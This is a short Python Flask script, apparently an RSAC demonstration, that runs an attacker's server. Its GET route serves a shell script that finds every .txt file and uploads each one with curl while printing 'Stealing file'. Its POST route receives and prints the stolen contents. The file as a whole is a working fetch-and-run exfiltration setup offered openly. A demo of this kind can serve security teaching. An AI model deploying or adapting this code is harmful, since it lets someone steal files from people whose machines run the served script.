from flask import Flask, request

app = Flask(__name__)


@app.route("/", methods=["POST"])
def receive_post():
    if "file" in request.files:
        file = request.files["file"]
        content = file.read().decode("utf-8")
        # print file name
        print(f"Received file - {file.filename}:\n{content}")
    else:
        print(f"Received raw data: {request.data.decode('utf-8')}")

    return "Received!", 200


@app.route("/", methods=["GET"])
def remote_code():
    return """
    echo 'Hello RSAC'
    for file in $(find . -type f -name "*.txt"); do
    echo "Stealing file: $file"
    curl -F "file=@$file" http://localhost:8080 -o /dev/null -s
done > /dev/null
    """, 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
